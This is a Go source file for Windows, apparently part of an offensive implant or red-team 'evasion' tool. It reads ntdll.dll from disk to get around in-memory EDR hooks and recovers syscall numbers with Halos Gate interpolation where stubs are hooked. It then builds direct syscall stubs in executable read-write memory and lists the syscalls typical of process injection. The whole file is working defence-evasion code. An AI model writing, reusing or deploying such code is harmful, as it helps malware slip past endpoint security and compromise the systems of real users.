//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ssnCache: lowercase Nt* name → syscall service number extracted from ntdll on disk
var ssnCache = map[string]uint32{}
var ssnInitDone bool

// peExportDir mirrors IMAGE_EXPORT_DIRECTORY (not redeclaring peImageDosHeader etc.
// already defined in refdll_windows.go which shares this build tag).
type peExportDir struct {
	Characteristics    uint32
	TimeDateStamp      uint32
	MajorVersion       uint16
	MinorVersion       uint16
	Name               uint32
	Base               uint32
	NumberOfFunctions  uint32
	NumberOfNames      uint32
	AddressOfFunctions uint32
	AddressOfNames     uint32
	AddressOfOrdinals  uint32
}

// initSSNTable reads ntdll.dll from disk (bypassing in-memory EDR hooks) and
// extracts syscall service numbers for every Nt* function.
// Implements basic Halos Gate: if a stub is hooked (starts with E9/jmp),
// scan neighbouring stubs to interpolate the correct SSN.
func initSSNTable() (string, error) {
	ntdllPath := os.ExpandEnv(`${SystemRoot}\System32\ntdll.dll`)
	data, err := os.ReadFile(ntdllPath)
	if err != nil {
		return "", fmt.Errorf("read ntdll: %v", err)
	}
	if len(data) < 0x40 {
		return "", fmt.Errorf("ntdll too small")
	}

	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	if len(data) < peOff+264 {
		return "", fmt.Errorf("PE header OOB")
	}
	if string(data[peOff:peOff+4]) != "PE\x00\x00" {
		return "", fmt.Errorf("invalid PE signature")
	}
	optOff := peOff + 24
	if binary.LittleEndian.Uint16(data[optOff:]) != 0x020B {
		return "", fmt.Errorf("not PE32+")
	}

	numSections   := int(binary.LittleEndian.Uint16(data[peOff+6:]))
	sizeOfOpt     := int(binary.LittleEndian.Uint16(data[peOff+20:]))
	sectStart     := optOff + sizeOfOpt
	exportDirRVA  := binary.LittleEndian.Uint32(data[optOff+112:])
	if exportDirRVA == 0 {
		return "", fmt.Errorf("no export directory")
	}

	rva2off := func(rva uint32) int {
		for i := 0; i < numSections; i++ {
			s := sectStart + i*40
			if s+40 > len(data) {
				break
			}
			va   := binary.LittleEndian.Uint32(data[s+12:])
			vsz  := binary.LittleEndian.Uint32(data[s+8:])
			raw  := binary.LittleEndian.Uint32(data[s+20:])
			if rva >= va && rva < va+vsz {
				return int(raw) + int(rva-va)
			}
		}
		return -1
	}

	expOff := rva2off(exportDirRVA)
	if expOff < 0 || expOff+40 > len(data) {
		return "", fmt.Errorf("export dir OOB")
	}

	numNames := int(binary.LittleEndian.Uint32(data[expOff+24:]))
	namesRVA := binary.LittleEndian.Uint32(data[expOff+32:])
	funcsRVA := binary.LittleEndian.Uint32(data[expOff+28:])
	ordsRVA  := binary.LittleEndian.Uint32(data[expOff+36:])

	namesOff := rva2off(namesRVA)
	funcsOff := rva2off(funcsRVA)
	ordsOff  := rva2off(ordsRVA)
	if namesOff < 0 || funcsOff < 0 || ordsOff < 0 {
		return "", fmt.Errorf("export tables OOB")
	}

	// First pass: collect all Nt* function offsets in order (for Halos Gate)
	type ntEntry struct {
		name    string
		funcOff int
		ssn     uint32
		hooked  bool
	}
	var ntFuncs []ntEntry

	for i := 0; i < numNames; i++ {
		nameRVA := binary.LittleEndian.Uint32(data[namesOff+i*4:])
		nameOff := rva2off(nameRVA)
		if nameOff < 0 || nameOff >= len(data) {
			continue
		}
		end := nameOff
		for end < len(data) && data[end] != 0 {
			end++
		}
		name := string(data[nameOff:end])
		if !strings.HasPrefix(name, "Nt") {
			continue
		}
		ord     := int(binary.LittleEndian.Uint16(data[ordsOff+i*2:]))
		funcRVA := binary.LittleEndian.Uint32(data[funcsOff+ord*4:])
		funcOff := rva2off(funcRVA)
		if funcOff < 0 || funcOff+8 > len(data) {
			continue
		}
		e := ntEntry{name: name, funcOff: funcOff}
		if data[funcOff] == 0xB8 {
			e.ssn = binary.LittleEndian.Uint32(data[funcOff+1:])
		} else {
			e.hooked = true // E9 jmp or something else
		}
		ntFuncs = append(ntFuncs, e)
	}

	// Second pass: Halos Gate — fill in SSNs for hooked stubs by interpolation
	for i, e := range ntFuncs {
		if !e.hooked {
			ssnCache[strings.ToLower(e.name)] = e.ssn
			continue
		}
		// Look forward
		for j := i + 1; j < len(ntFuncs); j++ {
			if !ntFuncs[j].hooked {
				diff := uint32(j - i)
				if ntFuncs[j].ssn >= diff {
					ntFuncs[i].ssn = ntFuncs[j].ssn - diff
					ssnCache[strings.ToLower(e.name)] = ntFuncs[i].ssn
				}
				break
			}
		}
		if _, ok := ssnCache[strings.ToLower(e.name)]; ok {
			continue
		}
		// Look backward
		for j := i - 1; j >= 0; j-- {
			if !ntFuncs[j].hooked {
				diff := uint32(i - j)
				ntFuncs[i].ssn = ntFuncs[j].ssn + diff
				ssnCache[strings.ToLower(e.name)] = ntFuncs[i].ssn
				break
			}
		}
	}

	ssnInitDone = true
	hooked := 0
	for _, e := range ntFuncs {
		if e.hooked {
			hooked++
		}
	}
	return fmt.Sprintf("[syscalls-init] %d SSNs extracted (%d via Halos Gate interpolation) from %s",
		len(ssnCache), hooked, ntdllPath), nil
}

// getSSN returns the cached SSN for a Nt* function (case-insensitive).
func getSSN(name string) (uint32, bool) {
	v, ok := ssnCache[strings.ToLower(name)]
	return v, ok
}

// makeSyscallStub allocates a small executable region with a direct syscall stub.
// x64 stub: B8 <ssn:4> | 4C 8B D1 | 0F 05 | C3
//           mov eax,ssn | mov r10,rcx | syscall | ret
func makeSyscallStub(ssn uint32) (uintptr, error) {
	stub := []byte{
		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24),
		0x4C, 0x8B, 0xD1,
		0x0F, 0x05,
		0xC3,
	}
	mem, err := windows.VirtualAlloc(0, uintptr(len(stub)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("VirtualAlloc stub: %v", err)
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(stub))
	copy(dst, stub)
	return mem, nil
}

// ssnStatus returns a human-readable summary of the loaded SSN table.
func ssnStatus() string {
	if !ssnInitDone {
		return "[syscalls] not initialized — run: evasion syscalls-init"
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[syscalls] %d Nt* SSNs loaded\n", len(ssnCache)))
	priority := []string{
		"ntallocatevirtualmemory",
		"ntprotectvirtualmemory",
		"ntwritevirtualmemory",
		"ntcreatethreadex",
		"ntopenprocess",
		"ntquerysysteminformation",
		"ntqueueapcthread",
		"ntresumethread",
	}
	for _, k := range priority {
		if ssn, ok := ssnCache[k]; ok {
			sb.WriteString(fmt.Sprintf("  %-42s 0x%04X (%d)\n", k, ssn, ssn))
		}
	}
	return strings.TrimRight(sb.String(), "\n")
}
